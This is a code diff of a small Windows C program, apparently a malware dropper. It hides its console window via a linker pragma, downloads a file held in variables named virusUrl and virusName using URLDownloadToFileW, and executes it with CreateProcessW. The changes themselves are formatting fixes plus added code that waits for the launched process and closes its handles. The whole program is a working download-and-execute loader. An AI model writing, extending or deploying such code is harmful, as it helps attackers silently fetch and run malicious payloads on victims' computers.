@@ -6,7 +6,7 @@
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 // Uses URLDownloadToFileW to download and save a file from the internet
-int downloadFile(WCHAR *downloadUrl, WCHAR *fileName) {
+int downloadFile(WCHAR* downloadUrl, WCHAR* fileName) {
     printf("Downloading the file (%ws) from (%ws)...\n", fileName, downloadUrl);
     return URLDownloadToFileW(NULL, downloadUrl, fileName, 0, NULL);
 }
@@ -25,10 +25,15 @@ int main(void) {
     downloadFile(virusUrl, virusName);
 
     // Creating new process and executing the file
-    if(!CreateProcessW(virusName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+    if (!CreateProcessW(virusName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         printf("CreateProcess failed (%lu).\n", GetLastError());
         return 1;
     }
-
+    else {
+        // Wait until child process exits.
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
     return 0;
 }
